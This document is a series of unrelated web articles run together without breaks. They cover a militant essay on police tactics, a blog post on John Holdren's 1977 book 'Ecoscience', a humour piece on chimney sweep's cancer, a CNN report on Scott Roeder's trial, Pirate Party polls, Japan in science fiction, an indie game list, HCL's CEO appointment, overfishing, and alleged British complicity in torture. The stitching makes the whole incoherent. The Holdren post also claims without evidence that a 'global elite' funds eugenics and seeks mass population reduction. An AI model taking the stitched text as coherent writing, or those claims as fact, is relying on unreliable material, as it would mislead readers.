As I said in Part 1 , the liberal or moralistic perspective on the police works from the assumption that both protesters and police have a valid goal and should therefore endeavour to find a compromise ( the beloved “ right to , and duty to facilitate , legitimate protest ) in which both can ‘ do their job ’ .
I know of no better definition of ‘ militant ’ than the rejection of this assumption .
Thus the second perspective to take on police tactics is this : that the goals of protesters are opposed to the goals of the police , that ultimately no compromise is possible , and that therefore neither side need concern themselves with preserving the basis of such a compromise .
To illustrate by contrast – when you argue with a friend , though you both want to win , you also want to preserve the friendship , and so ultimately you want an outcome that both are happy with .
So , unless you ’re foolish , you wo n’t do things that might help you to get your way but would so annoy or aggreive your friend as to endanger the friendship .
As well as separate goals , you both have a shared goal ( maintaining friendship ) which constrains the means you each use to pursue your separate goals .
Militancy then , the willingness to fight , is to give up the goal of being acceptable to the police , and to thus avoid the constrain that would put on methods .
It ’s accepting that what we want is not something that the police could accept while remaining police .
Correspondingly , class war is the belief that the interests of the proletarians - as - proletarians cannot be adequately satisfied in a way that would be acceptable to the bourgeoisie - as - bourgoisie .
This is controversial for capitalist society , but hopefully not controversial for other societies .
For example , no - one could deny that the interests of slaves as a class are incompatible with the interests of slave owners as a class – because they involve the abolition of the condition ( slavery ) that constitutes the oppression of one and the privilege of the other .
We should note that this arguably makes more room for sympathy with police officers as human beings .
On the liberal view , if something happens that should n’t have happened , it must be because someone did something wrong – if people were hurt , some police officer must have enacted their personal , culpable , brutality .
But the militant , though unlikely to like the police , can at least accept that brutality and filth - ish behaviour flows not from the personal evil of any individual but from what the police are , what they are for , the goals which have to frame their split - second decisions .
This means that a totally different set of questions are asked .
In place of ‘ did the police exceed their authority ? ’ or ‘ did the police use excessive force ? ’ , or conversely , ‘ did protesters use illegitimate methods ? ’ , the question becomes one of strategy .
What targets did each select , and how wise was that selection ?
What methods did they use , how wisely chosen , and how successful ?
For example , I would offer the following personal impression of one aspect of the police ’s plan for the last two days .
Although many things remain unclear and my viewpoint has been very partial , I get the impression that their main tactic on Wednesday was to corral groups in ‘ kettles ’ , to split people up from each other , and to hold people in one place for long periods of time , sometimes letting individuals leave one by one , in order to 1 ) prevent communication , organisation , or planned reactions on the part of protesters , and 2 ) make the protesters as despirited as possible , tired , frustrated , hungry or thirsty , and generally miserable .
This had two results – in the long run it deterred people from protesting , and in the short run it made people less likely to show up on Thursday .
Then on Thursday they were facing much smaller groups , only a hundred or so , and could get information , make arrests , take details , and exploit the general feeling of excitement to raid activist social centres .
That is , first frighten off the softcore , then go after the hardcore .
That may well not be what they were going for , but it ’s an illustration of the way that their tactics should be viewed – not in terms of ‘ was this within their legitimate authority ? ’ ( for example , is it legitimate for them to do things to discourage people from protesting in the future ?
surely that conflicts with ‘ legitimate protest ’? ) but simply – was it effective ?
And from what I can tell , the answer is largely ‘ yes ’ .
Damn .
It also implies that there ’s no point in people saying “ well , look at it from the police ’s point of view ” , or “ what would you do if you were a police officer ? ”
If I was a police officer , I would resign .
What would you do if you were a member of the Iraqi army , ordered into an invasion of Iran ?
There ’s no good answer , because as long as that is your role , you are in the wrong .
To give up your autonomy and your freedom to refrain from wrong actions ( like impeding people ’s efforts to fight climate change through direct action ) , carries over the culpability of those wrong actions .
The legitimate limits of police authority form a neat boundary around one choice – to resign .
Most Americans have never even heard of Barack Obama ’s top science advisor .
So who is he ?
His name is John P. Holdren , and he co-authored a book in 1977 in which he advocated mass sterilizations using the food and water supply , mandatory bodily implants that would prevent couples from having children , forced abortions for American couples trying to have too many children and a global police force to enforce population control .
Seriously .
This is Barack Obama ’s top science advisor .
Holdren advocated these horrific proposals in the 1977 book entitled “ Ecoscience ” , which he co-authored with Paul Ehrlich and Anne Ehrlich .
When reports of Holdren ’s book first started to surface , they were quickly dismissed by many because it just seemed so unbelievable that the top science advisor to the president of the United States would hold such bizarre beliefs .
However , once one blogger posted pictures of the pages of Holdren ’s book up on the Internet , people started to realize that Holdren really did write these things .
Let ’s take a look at some of the more shocking quotes from Holdren ’s book .
On page 837 , it is written that compulsory abortion would be perfectly legal under the Constitution of the United States :
“ Indeed , it has been concluded that compulsory population - control laws , even including laws requiring compulsory abortion , could be sustained under the existing Constitution if the population crisis became sufficiently severe to endanger the society . ”
On page 786 , the book says that single mothers should have their babies taken away by the government and that they could be forced to have abortions if the government decides that is best :
“ One way to carry out this disapproval might be to insist that all illegitimate babies be put up for adoption — especially those born to minors , who generally are not capable of caring properly for a child alone .
If a single mother really wished to keep her baby , she might be obliged to go through adoption proceedings and demonstrate her ability to support and care for it .
Adoption proceedings probably should remain more difficult for single people than for married couples , in recognition of the relative difficulty of raising children alone .
It would even be possible to require pregnant single women to marry or have abortions , perhaps as an alternative to placement for adoption , depending on the society . ”
On pages 787 and 788 , the book advocates the mass sterilization of humans by putting drugs in the water supply :
“ Adding a sterilant to drinking water or staple foods is a suggestion that seems to horrify people more than most proposals for involuntary fertility control .
Indeed , this would pose some very difficult political , legal , and social questions , to say nothing of the technical problems .
No such sterilant exists today , nor does one appear to be under development .
To be acceptable , such a substance would have to meet some rather stiff requirements : it must be uniformly effective , despite widely varying doses received by individuals , and despite varying degrees of fertility and sensitivity among individuals ; it must be free of dangerous or unpleasant side effects ; and it must have no effect on members of the opposite sex , children , old people , pets , or livestock . ”
On pages 786 and 787 , the authors discuss sterilizing women after their second or third child :
Involuntary fertility control
“ A program of sterilizing women after their second or third child , despite the relatively greater difficulty of the operation than vasectomy , might be easier to implement than trying to sterilize men .
The development of a long - term sterilizing capsule that could be implanted under the skin and removed when pregnancy is desired opens additional possibilities for coercive fertility control .
The capsule could be implanted at puberty and might be removable , with official permission , for a limited number of births . ”
On page 838 , the authors state their belief that there is nothing wrong or illegal about the government dictating family size :
“ In today ’s world , however , the number of children in a family is a matter of profound public concern .
The law regulates other highly personal matters .
For example , no one may lawfully have more than one spouse at a time .
Why should the law not be able to prevent a person from having more than two children ? ”
On pages 942 and 943 , the authors call for the development of a “ planetary regime ” that would control the global economy and enforce population control measures :
Toward a Planetary Regime
“ Perhaps those agencies , combined with UNEP and the United Nations population agencies , might eventually be developed into a Planetary Regime — sort of an international superagency for population , resources , and environment .
Such a comprehensive Planetary Regime could control the development , administration , conservation , and distribution of all natural resources , renewable or nonrenewable , at least insofar as international implications exist .
Thus the Regime could have the power to control pollution not only in the atmosphere and oceans , but also in such freshwater bodies as rivers and lakes that cross international boundaries or that discharge into the oceans .
The Regime might also be a logical central agency for regulating all international trade , perhaps including assistance from DCs to LDCs , and including all food on the international market . ”
“ The Planetary Regime might be given responsibility for determining the optimum population for the world and for each region and for arbitrating various countries ’ shares within their regional limits .
Control of population size might remain the responsibility of each government , but the Regime would have some power to enforce the agreed limits . ”
On page 917 , the authors advocate the surrender of national sovereignty to an armed international police force :
“ If this could be accomplished , security might be provided by an armed international organization , a global analogue of a police force .
Many people have recognized this as a goal , but the way to reach it remains obscure in a world where factionalism seems , if anything , to be increasing .
The first step necessarily involves partial surrender of sovereignty to an international organization . ”
The truly frightening thing , however , is that Holdren is not just one isolated nutjob .
Rather , his views are an accurate representation of what is commonly believed among the global elite .
They believe that the earth is way too overpopulated , and that if totalitarian measures are not taken it will have catastrophic consequences for the planet .
Those scientists who advocate eugenics and radical population control are funded and promoted by the global elite .
In fact , prior to becoming Obama ’s top science advisor , Holdren was the Teresa and John Heinz Professor of Environmental Policy at the Kennedy School of Government at Harvard University .
The truth is that the global elite are absolutely obsessed with reducing the population of this planet , and it would be a huge mistake to underestimate their obsession with population issues .
If you have any doubt about this fact , then you should read this article which we posted on a sister blog .
It is NOT acceptable for a member of the president ’s administration to believe in mass sterilization , forced abortions for American women and a global police force .
Please contact your representatives in Congress and ask them to call for the resignation of John Holdren .

10 Chimney Sweep 's Scrotum Cancer
Back in Victorian times , part of the chimney sweep job description was to go naked into the smaller chimneys because for some reason cleaning out caked on carcinogens whilst fully clothed just was n't funny or sadistic enough for Victorian sensibilities .
There was no higher form of entertainment back then than a decrepit , cancer - ridden chimney sweep with an ass crack Spackled shut with decades - old soot .
Continue Reading Below Advertisement
Unfortunately for the chimney sweep , a lifetime of this kind of work lead to chimney sweep 's cancer , or Cancer Scroti , because any disease that happens to your scrotum is just that much more depressing .
Malignant sores referred to as " soot wart " would appear , and then spread like a tiny , crusty army .
At first it was thought to be a venereal disease , as chimney sweeps were apparently known for being sooty gigolos , but eventually it was diagnosed as the first occupational cancer .
This is your scrotum on soot .
Any questions ?
Seeing as this took place in an age when medicine had n't graduated much beyond putting leeches on stab wounds and drinking tea to overcome broken limbs the cure was to cut off the " affected portions " .
Surprisingly the cure almost never worked , and the newly sackless sweeps would invariably die of some form of internal cancer .
It does explain why those lovable Cockney chimney sweeps in Mary Poppins sang such a sweet soprano , though .
( CNN ) -- A Kansas judge on Tuesday ordered an anti-abortion activist to stand trial in the death of a Wichita doctor who was gunned down at his church .
Scott Roeder is charged with killing Dr. George Tiller at a Kansas church .
Scott Roeder , 51 , pleaded not guilty after being bound over to trial on charges of first - degree murder in the death of Dr. George Tiller , who ran a women 's clinic in which he performed abortions .
Tiller was shot to death May 31 as services began at Reformation Lutheran Church .
Roeder also faces two charges of aggravated assault for threatening church members Gary Hoepner and Keith Martin .
Sedgwick County Judge Warren Wilbert scheduled Roeder 's trial for September 21 .
During a preliminary hearing Tuesday , Gary Hoepner , an usher and 52 - year member of the church , testified he was talking with Tiller before services when a man walked up to them , " put a gun right up to George 's head and shot it . "
Hoepner said he heard only a small " pop " and wondered if the gun might have been a cap gun .
But he said he knew he was wrong when Tiller fell .
Tiller , 67 , was one of the few U.S. doctors who performed late - term abortions .
He had already survived one attempt on his life before he was slain .
In the wake of his death , his family decided to close his clinic permanently .
Watch why Roeder 's ex is n't surprised »
Wearing a white shirt and gray jacket with a maroon tie , Roeder listened intently to the testimony Tuesday without expression .
Hoepner and another usher , Keith Martin , both testified during the daylong hearing that they pursued the shooter out of the church .
Hoepner said the man yelled at him that he had a gun and would shoot them .
" I believed him , " Hoepner said .
" I stopped . "
But he said he got his cell phone from his truck and called 911 .
Watch Hoepner 's testimony during preliminary hearing
Church member Thornton Anderson testified he had been running late and had difficulty finding a parking space .
As he left his car , he saw two men following a third and heard someone yelling , " Get the tag number ! " as the first man got into a car .
He did , and ran to Hoepner to give it to him , he testified .
Hoepner identified Roeder as the man he saw that day , and testified he had also seen him at the church the Sunday before the incident .
Church members told him the man had placed a note in the church 's collection plate , Hoepner said , and that the same man had done so previously .
Anderson also said he had seen the man at the church , saying he remembered the man was balding and " his clothes did n't match very well . "
Church members were suspicious of him , Anderson said under cross-examination by Roeder 's attorneys , because " nobody knew who he was and nobody knew why he was there . "
Martin testified that Tiller was absent from church the previous Sunday , May 24 .
Martin said when the shooting occurred , he heard a loud noise and saw Tiller on the floor .
He looked out the window , he testified , and saw a man running away from the church .
It was the same man he had seen at church several times previously , he said , although he did not know on what dates .
He said he had noticed the man " had a horrible smell about him .
...
It was n't just somebody at the gym smell .
It was something more , an ammonia - type smell . "
He identified Roeder as the man he had seen .
He said he pursued the man , who then pointed the gun at him .
Martin said he could see " straight down the barrel " before he got out of the way and the man escaped .
On cross-examination , Martin said the church has been targeted for protests in the past , with at least some of them coming because of Tiller 's membership and his occupation .
Tiller was shot in the head at close range , according to testimony Tuesday from Jaime Oeberst , chief medical examiner for Segwick County .
This preliminary hearing is a sort of mini-trial , as the prosecution lays out its case against the suspect .
Roeder is jailed on a $ 20 million bond .
Wilbert increased the bond fourfold after Roeder spoke to news organizations , including CNN .
In a June 9 jailhouse interview with CNN's Ted Rowlands , Roeder stopped short of admitting he shot Tiller , but said that if he is convicted , " the entire motive was the defense of the unborn . "
All About George Tiller • Scott Roeder • Abortion
Two separate polls have today indicated that the Pirate Party could win at least one of Sweden 's 18 seats in the European Parliament elections .
Results are n't expected until Sunday , but surveys suggest that the anti-copyright , pro-filesharing party may have grabbed between six and eight per cent of the vote in Sweden .
Filesharing has been a heated topic in Sweden .
Earlier this year , founders of The Pirate Bay were convicted of being accessories to breaching copyright laws and handed one - year jail terms , following a landmark trial in Stockholm .
Unsurprisingly , the decision swelled support for one - issue outfit the Pirate Party .
A poll commissioned by the Synovate Institute , which surveyed 1,482 voters over the past week , found 6.1 per cent in favour of the party - which translates as one seat in the European Parliament .
A separate survey by polling group SIFO suggested the Pirate Party could win two seats , after it pulled in 8.2 per cent from a survey of 1,897 voters in Sweden .
Of course , whether or not those people polled actually cast their vote at the ballot box remains to be seen .
We 'll know one way or the other on 7 June . ®
U.S. science fiction used to be fascinated with Japan , from Blade Runner to Neuromancer .
Everything Japanese was cooler , sleeker and shinier than our grubby American aesthetic , and Japan was destined to dominate .
And then , Japan 's futuristic status waned .
What happened ?

There 's a pervasive urban legend online that William Gibson went to see Blade Runner when he was working on his seminal Japanophile cyberpunk novel , Neuromancer .
And Gibson ran out of the theater a few minutes into the movie ( or in some versions , just walked out ) because he was so shocked by the similarites between that movie 's vision of the future and the one depicted in his novel .
( In some versions , Gibson is scared that Ridley Scott and co. are actually in his head . )
Gibson is quoted as saying :
Modern Japan simply was cyberpunk .
The Japanese themselves knew it and delighted in it .
I remember my first glimpse of Shibuya , when one of the young Tokyo journalists who had taken me there , his face drenched with the light of a thousand media - suns - all that towering , animated crawl of commercial information - said , ‘ You see ?
You see ?
It is Blade Runner town . '
And it was .
It so evidently was .

Back in the early 1980s , Japan 's ascendance seemed assured — there were a host of business books claiming that Japan had lost World War II , but won the peace through superior economic policies .
Books like The Enigma Of Japanese Power by Karel Van Wolferen became unlikely bestsellers .
Meanwhile , Japanese politicians like Ishihara Shintaro started flexing their muscles — Ishihara made waves with a book called No To Ieru Nihon , or The Japan That Can Say No ( to the United States . )
G/O Media may get a commission LG 75 " 8 K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
But also , Japanese technology was clearly better , and Japanese pop culture looked cool .
In the early 1980s , U.S. television started being flooded with anime programs like Robotech and Star Blazers0 , and U.S. comics fans started discovering Manga .
But the one - two punch of Blade Runner and Neuromancer was what settled it : for the next decade or so , Japan was how we viewed the future .
And given that the 1980s was a very neon - happy time in general , and the U.S. viewed Japanese cities as being splashy and full of neon lights , it made sense that Japanese influences crept into everything .
Total Recall , for example , features Arnold Schwarzenegger running around a neon - drenched future cityscape , especially once he goes to Mars .
It 's not specifically Japanese , but it feels Japan - influenced .

In Back To The Future 2 , Future Biff works for a mysterious Japanese businessman known as Mr. Fujitsu , and it's hinted that by 2015 , Japan dominates the world 's economy .
( The film - makers pretty much come out and say this on the DVD commentary . )
In the Max Headroom TV series , the world is dominated by the ZikZak Corporation , which despite its non-Japanese - sounding name , is actually a Japanese company .
And the dystopian cityscape ( around a minute in ) looks very Blade Runner inspired :
In the early 1990s , Marvel launched its futuristic " 2099 " titles , with Rampage 2099 and Spider - Man 2099 among others .
And one of the things that was futuristic and different about the world of 2099 was the fact that Tony Stark 's company , Stark Industries , had turned Japanese , and was now known as Stark - Fujikawa .

And the U.S. got its own home - grown anime program with 1991's Aeon Flux , airing on MTV :
Around that same time , we started to see a lot more Asian influences in animation , including shows like Batman : The Animated Series .

To some extent , any movie with " virtual reality " or " cyberpunk " influences kept bringing back a Japanophile vibe , like 1995 's Virtuosity , which had one of its crucial scenes between Denzel Washington and Russell Crowe 's virtual killer take place in a sushi bar :
And the politically correct , scrubbed San Angeles of 1995 's Demolition Man was a blend of L.A. and Tokyo , in both its buildings and its fashions :
Famously , the cyberpunk trainwreck Johnny Mnemonic featured a whole slew of scenes and subplots that took place in Japan , revolving around the character of Mr. Takahashi , played by popular actor Takeshi Kitano .
These scenes are still only available on the Japanese DVD :
Sadly , Japan 's economic hegemony ran out of juice in the early 1990s , when their real - estate bubble burst ( sound familiar ? ) and the country spent an entire " lost decade " mired in stagnation .
The vision of Japan as future economic uberpower was replaced by a creeping irrelevance — but Japanese pop culture remained as influential as ever , maybe even more than during the powerhouse days .

And because nothing in science fiction ever really goes away , there are still plenty of examples of Japanophile influences in recent SF .
Take Steven Spielberg 's A.I. , whose future city looks a lot like Tokyo .
( Skip to 4:45 in this video ) :
The shiny metropolis of Coruscant has a very Neo Tokyo vibe , in Star Wars : Attack Of The Clones ( go to around 2:40 in this video ) :
When we visit a future Batman , who 's trained by an aging Bruce Wayne to wear a Bat - exoskeleton , in Batman Beyond , the future Gotham is covered with Japanese kanji :
Joss Whedon made waves with his show Firefly and the sequel movie Serenity , which take place in a sort of vaguely pan-Asian future where everybody peppers his / her speech with a kind of pidgin Chinese .
( Although there are no actual Asian people around . )
And this Fruity Oaty Bars commercial has a pronounced anime vibe :
And of course , Aeon Flux got its own live - action movie a few years ago :

Trilby 's Notes - the third game in the John DeFoe series ( eventually a quadrilogy ) , which expands the storyline and connects 5 Days and 7 Days .
Master thief turned paranormal investigator Trilby follows the trail of John DeFoe 's soul idol to a small hotel in Wales , where he discovers the dark history of the cursed wood .
1213 - Another game derived from my experiments with AGS , 1213 is a psychological adventure in the style of Flashback , as in running shooting climby up ledges etc .
It 's about an amnesiac who wakes up in a cell not knowing how he - hey , where 're you going ?
It gets better , honest !
Adventures in the Galaxy of Fantabulous Wonderment - Just about the only full game thus far produced by my experiments in using AGS to create different genres and play styles .
GFW is an open - ended adventure where you are free to faff about doing other things in between following the main storyline .
7 Days A Skeptic -
The sequel to 5 Days A Stranger .
Four hundred years into the future , the scoutship Mephistopheles and its crew of six discovers something it should have left alone .
5 Days A Stranger - A cat burglar breaks into a supposedly deserted country mansion , only to find himself imprisoned along with four strangers by a mysterious force .
A nice nasty horror game with some murders and gore , with the distinction of being the ... er... sixth complete game I 've made with AGS .
Age of Evil - If you do n't own Duke Nukem 3D Atomic Edition version 1.4 or 1.5 , give this one a miss .
If you do , congratulations !
You belong to the elite few who can play this , a horror comedy themed Duke Total Conversion which replaces boring old macho Duke with a smartarse Brit .
No Experience Necessary -
This is n't a game at all , but rather a script for a highly derivative FPS game based loosely on one of my abandoned novel attempts .
I 'm hoping some game developer will notice it and pay me oodles of money to make it .
I am something of a blind optimist .
The Trials of Odysseus Kent -
This game technically should n't exist since I wrote it after I gave up making games , but here it is .
Life will find a way , I guess .
The Rob Blanc Trilogy -
The three adventures of everyday joe Rob Blanc and his green - haired sidekick Paul as they travel throughout the galaxy writing wrongs and making bad jokes .
They are a tribute to the old Sierra games of yesteryear .
I say that to excuse the fact that the entire universe is drawn in MS Paint .
If you wish to draw my attention to the ' I do n't know where to go ' bug in Rob Blanc 2 , please do n't , as ninety - three million people have beaten you to it .
The Arthur Yahtzee Trilogy -
Three curiously long adventures again drawn in MS Paint and badly programmed in Visual Basic 3 .
I wrote them so long ago that I did n't have internet access at the time and had to let a friend make a site for them .
That site went down ( thank heaven for small mercies ) , so I got hold of the games , uploaded them to the FullyRamblomatic server and a good time was had by all .

CHENNAI : Roshni Nadar , the daughter of business tycoon Shiv Nadar , has been appointed CEO of the HCL group���s holding company , giving her potential power and control over a $ 5 - billion group with marque customers such as Boeing and Airbus and an employee base of 60,000 . (
)
Ms Nadar , who studied MBA at the Kellogg University and is a trained classical musician , was appointed CEO and executive director at HCL Corp , the holding company , in April this year .
She took over from her father who will continue to be the chairman and focus only on strategic issues .
Mr Nadar , who was in Chennai along with his daughter to announce developments in their educational initiatives , said his daughter���s role will be confined to just HCL Corp .
She will not be involved in the day - to - day operations of HCL Technologies , India���s fourth - largest software services exporter , and HCL Infosystems ��� the two publicly - held companies .
���These organisations are run by highly corporatised boards .
At the moment , she is responsible for the holding company , which is HCL Corporation , none of the operational companies .
She joined in April this year .
She runs the treasury , all the new investment decisions will be taken by her , ��� Mr Nadar told ET in an exclusive interview .
He added that he will focus on ���developing a vision for the group��� .
Ms Nadar���s appointment comes during a period of churn and change in the top management of India���s leading IT companies , and signifies , in some cases , the inevitable transition from the old guard to the new .
After having built the companies from scratch into world - beating corporations , some of the key leaders are either receding into the background or giving up their positions to do other things .
Last week , Nandan Nilekani , the co-chairman of the Bangalore - based Infosys Technologies and one of the most well - known brand ambassadors for India and Indian IT , quit to head a special project for the government ; S Ramadorai , among those instrumental in making TCS India���s largest software services exporter , will step down in August as CEO after 37 years with the company .
He will be replaced by N Chandrasekharan .
Clear succession plan crucial
Rishad Premji , software tycoon Azim Premji���s elder son , on Wednesday took over his new role in Wipro as general manager , treasury and investor relations .
Rishad is being looked upon by many as a possible successor , though Mr Premji has made it clear that if he wants to lead the company , it can only happen after he has earned his way in a normal process .
These changes are very important in an industry that generates annual export revenue of $ 40 billion and employs about three million people worldwide .
A clear succession plan and a strong second rung is crucial to ensure smooth transition and the continuation of the success that Indian IT has achieved so far .
Mr Nadar and other HCL officials did not dwell upon Ms Nadar���s duties in her new role .
They said that she would be responsible for strategic decision - making of HCL Corporation , and would also be involved in brand - building across the HCL group companies .
HCL Technologies��� corporate vice - president for strategy Saurav Adhikari said that Ms Nadar is involved only in HCL Corporation , and not either HCL Infosystems or HCL Technologies ��� both managed by a group of professionals .
Another top official of the company , who sits in New Delhi , on condition of anonymity , said : �� �This is a family affair and not a company affair , so it���s not a major development .
The holding company also has its own requirements for governance and management .���
HCL Corp owns 49.69 % in HCL Technologies and 44.32 % stake in HCL Infosystems .
The two companies are worth more than Rs 13,000 crore .
Ms Nadar studied at Vasant Valley School , New Delhi , and did her undergraduate in radio , TV and film studies from Northwestern University , Illinois .
Later , she did an MBA in social enterprise management and strategy from Kellogg .

In the babbling Babel of 24/7 news – where elections , bailouts and beheadings blur into one long shriek – the slow - motion stories that will define our age are often lost .
An extraordinary documentary released next week , The End of the Line , forces us to stop , and see .
Its story is stark .
In my parents ' lifetime , we have killed 90 per cent of the world 's fish .
In my lifetime , we will finish off the rest – unless we change our ways , fast .
We are on course to be the people who wiped fish from the earth .
The story begins in the sleepy Canadian resort of Newfoundland .
It was the global capital of cod , a fishing town where the scaly creatures of the sea were so abundant they could be caught with your hands .
But in the 1980s , something strange happened .
The catches started to wane .
The fish grew smaller .
And then , in 1991 , they disappeared .
It turned out the cod had been hoovered out of the sea at such a rapid rate that they could n't reproduce themselves .
But the postscript is spookier still .
The Canadian government banned any attempts at fishing there , on the assumption that the few remaining fish would slowly repopulate the waters .
But 15 years on , they have n't .
The population was so destroyed that it could never recover .
Download the new Independent Premium app Sharing the full story , not just the headlines
A growing number of scientists are warning that we could all be living in Newfoundland soon .
Professor Boris Worm of Dalhousie University published a detailed study in the prestigious peer - reviewed journal Nature saying that at the current rate , all global fish populations will have collapsed by 2048 .
He says : " This is n't some horror scenario , it 's a real possibility .
It 's not rocket science if we 're depleting species after species .
It 's a finite resource .
We 'll reach a point where we run out . "
The species in the frontline is bluefin tuna , the pinnacle of the evolutionary chain for fish .
This little creature can swim at 50 mph , and accelerate faster than the swishest sports car .
It has even developed warm blood .
Yet every year , a third of the remaining population is ripped from the seas and slapped onto our plates .
Soon , it will be gone .
All over the world , from the Bay of Bengal to Lake Victoria to the shores of South America , I have heard fishermen say their catches are shrinking , in size and in number .
Industrial - scale fishing only began in the 1950s .
By the standards of the news cycle , this is slow – but by the standards of the planet or of settled fishing communities , this is a click of the fingers .
The effects of the new industrial fishing are uniform .
Professor Ransom Myers found that whenever the vast industrial trawlers are sent in , it takes just 15 years to reduce the fish population to a 10 % shadow of its former self .
This process of trawlering is an oceanic weapon of mass destruction , ripping up everything in its path .
Charles Clover , who wrote the book on which the documentary is based , has a good analogy for it .
Imagine a band of hunters stringing a mile of net between two massive all - terrain vehicles and dragging it at speed across the plains of Africa .
Imagine it scooping up everything in its way : lions and cheetahs and hippos and wild dogs .
The net has a massive metal roller attached to its leading edge , smashing down every tree that gets in its way .
And in the end , when the hunters open up the net , they pick out the choicest creatures and dump the squashed remains in the sun as carrion for the vultures .
But we need fish .
Our brains do n't form properly without their fatty Omega - 3 acids .
So why do our governments allow this process of destruction to continue ?
Why do they actively encourage it , with $ 14bn of subsidies for fishermen to keep on trawling every year ?
A small number of people are making a lot of short - term profit out of this destruction – and they are using this cash to ensure they can carry on hunting , down to the last fish .
In 1992 , an attempt to get the bluefin tuna listed as an endangered species was scuppered by the US and Japanese governments at the urging of the tuna lobby – who happen to give large campaign donations to all parties .
A similar corruption has eaten into European politics .
Add to this the fact that fishermen are a determined and demanding constituency with an equally short - term agenda .
They demand the maximum quotas today – even if that means no quotas tomorrow .
Our societies are structured to put these short - term cries for money for a few ahead of the long - term needs of us all .
A small determined group with hard cash almost always beats a diffuse group with good intentions – until they get angry and fight back .
Yet today , ordinary people in rich countries are being insulated from the fish crisis .
As we exhaust our own fish stocks , our corporations are sailing out across the world to steal them from the poor .
Today , there are armadas of industrial European and American fishing boats across the coast of West Africa , leaving the small fishermen who live on its coasts to starve .
Professor Daniel Pauly says : " It is like a hole burning through paper .
As the hole expands , the edge is where the fisheries concentrate , until there is nowhere left to go . "
We are not only stealing fish from Africans ; we are stealing them from future generations .
In the age of limits , we are hitting up against the capacity of the planet to provide for us – yet we are reacting with blank denial .
This story is unfolding , in one form or another , in the rainforests , the air , and in the planet 's climate itself .
It has left us at a strange crossroads .
We will either be a despised generation who left behind a depleted husk - planet – or a heroic generation who , at five minutes to ecological midnight , turned back to the light .
With fish , the solution is even simpler and more straightforward than with the other ecological crises ensnaring us .
The scientific experts say we need to follow two steps .
First , expand the 0.6 per cent of the area of the world 's oceans in which fishing is banned to 30 per cent .
In these protected areas , fish can slowly recover .
Second , in the remaining 70 per cent , impose strict quotas on fishermen and police it properly , as they do in Alaska , New Zealand and Iceland .
The cost of this programme ?
$ 14bn a year – precisely the sum we currently spend on subsidising fishermen .
At no extra cost , we could turn them from the rapists of the oceans into their guardians .
Yet The End of the Line has one flaw – and it is one that riddles current environmental thought .
It presents us with a great earth - altering crisis , and then says our primary response should be to change our own personal consumption habits .
It urges people not to buy from Nobu , which shamefully still sells bluefin tuna , and to ask if the fish we buy is sustainably produced .
It 's like the end of An Inconvenient Truth , where the primary response Al Gore presses on us is to shop green and change our lightblubs .
Of course this is valuable – but it is only an anemic and minor first step .
It is rather like , in 1937 , reacting to the rise of Nazism by urging people to make sure that they personally were n't killing any Jews or gays or Jehovah 's Witnesses , or buying from any Nazi - owned companies .
We needed collective action that would stop other people from killing these minorities – just as today we need collective action that prevents anyone from irreparably trashing the means of life .
At the moment , many good people get anxious about environmental issues , and hear the message that The Response is to scrub their own lifestyle clean .
Yet individual voluntary action by a minority of nice people will not save the bluefin tuna , never mind the ecosystem .
But if all these honourable people act together – by volunteering for , and donating to , organizations like Greenpeace , Friends of the Earth and Plane Stupid – they can change the law , so everybody will be required to change their behaviour , not just a benevolent 10 per cent .
It was just such determined minorities armed with the facts that spurred the fights against slavery , colonialism and fascism .
When you respond as a consumer , you are weak ; when you respond as a citizen , you are strong .
The voice of millions of people can drown out the concentrated power of the fishing industry – and all the other industries with a vested interest in trashing our planet – but not with the swipe of a credit card .
The alternative to collective action today is catastrophe tomorrow .
As Charles Clover explains : " When the human population comes under pressure on land because of global warming , when we are running out of ways to feed ourselves , we [ will ] have just squandered one of the greatest resources on the planet – wild fish . "
The epitaph for the human species would turn out to have been scripted by Douglas Adams : so long , and thanks for all the fish .

The true depth of British involvement in the torture of terrorism suspects overseas and the manner in which that complicity is concealed behind a cloak of courtroom secrecy was laid bare last night when David Davis MP detailed the way in which one counter - terrorism operation led directly to a man suffering brutal mistreatment .
In a dramatic intervention using the protection of parliamentary privilege , the former shadow home secretary revealed how MI5 and Greater Manchester police effectively sub-contracted the torture of Rangzieb Ahmed to a Pakistani intelligence agency , the Inter - Services Intelligence Directorate ( ISI ) , whose routine use of torture has been widely documented .
This is the first time that the information has entered the public domain .
Previously it has been suppressed through the process of secret court hearings and , had the Guardian or other media organisations reported it , they would have exposed themselves to the risk of prosecution for contempt of court .
Davis told MPs that although sufficient evidence had been gathered to ensure Ahmed could be prosecuted for serious terrorism offences , he was permitted to fly from Manchester to Islamabad , the Pakistani capital , in 2006 while under surveillance .
He then detailed the way in which the British authorities :
• Tipped off the ISI that Ahmed was on his way .
• Told the ISI he was a terrorist and suggested that he should be detained .
• Were aware of the methods used by the ISI while questioning terrorism suspects .
• Drew up a list of questions for the ISI to put to Ahmed .
• Questioned him themselves after he had been in ISI custody for around 13 days .
The officers from MI5 and MI6 who interrogated Ahmed should have known his detention was unlawful because he had not been brought before a court .
Ahmed says he told these officers he was being tortured and that signs of his mistreatment would have been evident .
He says he was whipped , beaten , deprived of sleep and sexually humiliated .
At one point three fingernails were ripped out of his left hand .
He says this was done slowly , over a period of days , while he was being asked questions which he believes were handed to the ISI by British and US authorities .
Addressing the Commons last night , Davis said : " A more obvious case of outsourcing of torture , a more obvious case of passive rendition , I can not imagine .
He should have been arrested by the UK in 2006 .
He was not .
The authorities knew he intended to travel to Pakistan , so they should have prevented that .
Instead , they suggested the ISI arrest him .
They knew he would be tortured , and they organised to construct a list of questions and provide it to the ISI . "
Ahmed was deported to the UK after 13 months in Pakistani custody , prosecuted largely on the basis of evidence gathered before he had travelled to that country , and jailed for life after being found guilty of membership of al - Qaida and directing a terrorist organisation .
The jury at Manchester crown court was not told he had been tortured , and some details of the police and MI5 counter - terrorism operation that resulted in his torture would have been heard in camera , before his trial began and after the media and the public had been excluded from court .
Yesterday the Guardian reported that Ahmed alleges he was recently visited by an MI5 officer and a police officer who said they could arrange for his sentence to be reduced , or for him to be paid money , if he withdrew his complaints about torture during his forthcoming appeal and during civil proceedings in which he is suing the British government .
Davis said if this claim was true it was " frankly monstrous " .
Ahmed is one of several British citizens and residents who have alleged British complicity in their torture in Pakistan , Bangladesh , Egypt and the UAE during the so - called war on terror .
Davis told MPs : " For each case , the government has denied complicity , but at the same time fiercely defended the secrecy of its actions which has made it impossible to put the full facts in the public domain , despite the clear public interest to doing so . "
Ahmed , he said , " was astonishingly not arrested but was allowed to leave the country … the British intelligence agencies wrote to their opposite numbers in Pakistan , the ISI , to suggest that they arrest him " .
